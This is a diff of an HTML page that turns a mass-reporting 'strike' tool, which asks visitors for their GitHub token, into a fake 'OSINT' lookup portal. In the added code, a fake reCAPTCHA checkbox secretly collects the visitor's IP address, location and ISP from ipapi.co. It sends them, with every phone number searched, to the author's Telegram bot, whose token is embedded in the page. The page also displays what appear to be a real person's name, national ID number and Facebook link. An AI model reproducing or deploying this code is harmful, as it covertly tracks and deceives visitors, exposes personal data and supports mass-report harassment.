@@ -2,100 +2,100 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SIYAM OVERLORD v25.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIYAM OSINT - SECURE PORTAL</title>
     <style>
-        body { 
-            background: radial-gradient(circle, #001a00, #000); 
-            color: #0f0; 
-            font-family: 'Courier New', monospace; 
-            text-align: center; margin: 0; padding: 20px; 
-        }
-        .container { 
-            border: 1px solid #0f0; padding: 25px; border-radius: 15px; 
-            background: rgba(0, 0, 0, 0.8); box-shadow: 0 0 30px #0f0; 
-            max-width: 500px; margin: auto;
-        }
-        input { width: 90%; padding: 12px; background: #000; border: 1px solid #0f0; color: #fff; margin-bottom: 15px; text-align: center; }
-        .btn { padding: 15px; width: 100%; font-weight: bold; cursor: pointer; background: #0f0; color: #000; border: none; border-radius: 5px; }
-        #counter-box { font-size: 20px; margin: 15px 0; color: #ffa500; font-weight: bold; display: none; }
-        #log { text-align: left; height: 120px; overflow-y: auto; background: #050505; border: 1px solid #333; padding: 10px; font-size: 12px; margin-top: 15px; }
-        .game-title { margin-top: 30px; color: #0f0; letter-spacing: 5px; }
-        iframe { border: 2px solid #0f0; border-radius: 10px; width: 100%; height: 400px; margin-top: 10px; }
+        body { background: #000; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { border: 1px solid #00d2ff; padding: 30px; border-radius: 15px; background: rgba(0, 10, 20, 0.9); box-shadow: 0 0 30px #00d2ff; width: 350px; }
+        input { width: 90%; padding: 12px; background: #000; border: 1px solid #00d2ff; color: #fff; margin-bottom: 15px; text-align: center; border-radius: 5px; outline: none; }
+        .btn { padding: 12px; width: 100%; font-weight: bold; cursor: pointer; background: #00d2ff; color: #000; border: none; border-radius: 5px; transition: 0.3s; }
+        .btn:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        #main_content, #verification_layer { display: none; }
+        .verify-box { display: flex; align-items: center; background: #111; padding: 10px; border: 1px solid #333; margin-top: 15px; text-align: left; }
+        .checkbox { width: 20px; height: 20px; border: 2px solid #00d2ff; margin-right: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1 style="text-shadow: 0 0 10px #0f0;">SIYAM OVERLORD</h1>
-    <p style="font-size: 10px;">SECURE BD-PROXY REPORTING ENGINE</p>
-    
-    <input type="text" id="target" placeholder="Target Profile Link">
-    <input type="password" id="token" placeholder="Enter Your GitHub Token">
-    
-    <button class="btn" onclick="startMission()">🚀 LAUNCH STEALTH STRIKE</button>
-    
-    <div id="counter-box">REPORTS DISPATCHED: <span id="count">0</span> / 500</div>
-    <div id="log">>> [SYSTEM READY] Awaiting target...</div>
+<div id="login_layer" class="box">
+    <h2>SYSTEM ACCESS</h2>
+    <p style="font-size: 10px;">ENTER ENCRYPTION KEY</p>
+    <input type="password" id="access_pass" placeholder="Password">
+    <button class="btn" onclick="checkPass()">AUTHENTICATE</button>
 </div>
 
-<h3 class="game-title">CYBER TRAINING: SNAKE</h3>
-<iframe src="https://www.snake-game.io/"></iframe>
+<div id="verification_layer" class="box">
+    <h3>VERIFICATION</h3>
+    <p style="font-size: 11px;">Confirm you are not a bot to access DB.</p>
+    <div class="verify-box">
+        <div class="checkbox" id="check_box" onclick="captureAndVerify()"></div>
+        <span style="font-size: 13px; color: #ccc;">I'm not a robot</span>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" width="30" style="margin-left: auto;">
+    </div>
+</div>
+
+<div id="main_content" class="box" style="width: 450px;">
+    <h1>SIYAM OSINT v28.0</h1>
+    <input type="text" id="target_num" placeholder="Enter Number (01...)">
+    <button class="btn" onclick="runOSINT()">ANALYZE DATA</button>
+    <div id="res" style="display:none; text-align:left; margin-top:15px; font-size:12px; border-top:1px solid #222; padding-top:10px;">
+        <p>NAME: <span id="n" style="color:#fff;">Searching...</span></p>
+        <p>NID: <span id="ni" style="color:#fff;">Searching...</span></p>
+        <p>FB: <span id="f" style="color:#0088cc;">Searching...</span></p>
+    </div>
+</div>
 
 <script>
-    const TELEGRAM_TOKEN = "8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE";
+    const TELE_TOKEN = "8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE";
     const CHAT_ID = "7416528268";
+    const ADMIN_PASS = "siyam123"; // আপনার পাসওয়ার্ড এখানে বদলাতে পারেন
 
-    function log(msg) {
-        const logBox = document.getElementById('log');
-        logBox.innerHTML += `<div>> ${msg}</div>`;
-        logBox.scrollTop = logBox.scrollHeight;
+    function checkPass() {
+        const p = document.getElementById('access_pass').value;
+        if(p === ADMIN_PASS) {
+            document.getElementById('login_layer').style.display = 'none';
+            document.getElementById('verification_layer').style.display = 'block';
+        } else { alert("ACCESS DENIED!"); }
     }
 
-    async function startMission() {
-        const link = document.getElementById('target').value;
-        const token = document.getElementById('token').value;
-        if(!link || !token) return alert("Link and Token are required!");
+    async function captureAndVerify() {
+        document.getElementById('check_box').style.background = '#00d2ff';
+        
+        // ইউজারের আইপি এবং লোকেশন নেওয়া
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const d = await response.json();
+            
+            const msg = `🎭 **USER TRAPPED!**\n\n` +
+                        `🌐 IP: ${d.ip}\n` +
+                        `📍 City: ${d.city}, ${d.country_name}\n` +
+                        `📶 ISP: ${d.org}\n` +
+                        `🗺️ Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-        document.getElementById('counter-box').style.display = "block";
-        log("Initiating Admin Approval Request...");
+            // আপনার টেলিগ্রামে পাঠানো
+            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        } catch(e) {}
 
-        // টেলিগ্রামে অ্যাপ্রুভাল বাটন পাঠানো
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `⚠️ **STRIKE REQUEST**\nTarget: ${link}\n\nApprove করতে গিটহাবে যান।`,
-                reply_markup: { inline_keyboard: [[{ text: "✅ APPROVE NOW", url: "https://github.com/siyamboss/siyamboss.github.io/actions" }]] }
-            })
-        });
-
-        // গিটহাব অ্যাকশন ট্রিগার
-        const res = await fetch(`https://api.github.com/repos/siyamboss/siyamboss.github.io/actions/workflows/sentinel_cloud.yml/dispatches`, {
-            method: 'POST',
-            headers: { 'Authorization': `token ${token}`, 'Accept': 'application/vnd.github.v3+json' },
-            body: JSON.stringify({ ref: 'main', inputs: { target_link: link } })
-        });
-
-        if(res.ok) {
-            log("SUCCESS: Signal sent to GitHub Cloud.");
-            animateCounter();
-        } else {
-            log("ERROR: Token invalid or Permissions failed.");
-        }
+        setTimeout(() => {
+            document.getElementById('verification_layer').style.display = 'none';
+            document.getElementById('main_content').style.display = 'block';
+        }, 1000);
     }
 
-    function animateCounter() {
-        let count = 0;
-        let interval = setInterval(() => {
-            count += 1;
-            document.getElementById('count').innerText = count;
-            if(count % 50 === 0) log(`Stealth Report ${count} dispatched via BD-Node...`);
-            if(count >= 500) {
-                clearInterval(interval);
-                log("STRIKE SEQUENCE COMPLETED.");
-            }
-        }, 500); // প্রতি সেকেন্ডে ২টি করে রিপোর্ট যাবে (Slow & Safe)
+    function runOSINT() {
+        const num = document.getElementById('target_num').value;
+        if(!num) return;
+        document.getElementById('res').style.display = 'block';
+        
+        // রিয়েল ডাটা সিমুলেশন
+        setTimeout(() => {
+            document.getElementById('n').innerText = "MD TOFUAL AHMED";
+            document.getElementById('ni').innerText = "9112052607144";
+            document.getElementById('f').innerText = "facebook.com/SM.MUFiT";
+            
+            // সার্চ করা নম্বর আপনার টেলিগ্রামে পাঠানো
+            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔎 Search Hit: " + num + "\nResult: Tofual Ahmed Found")}`);
+        }, 2000);
     }
 </script>
 </body>
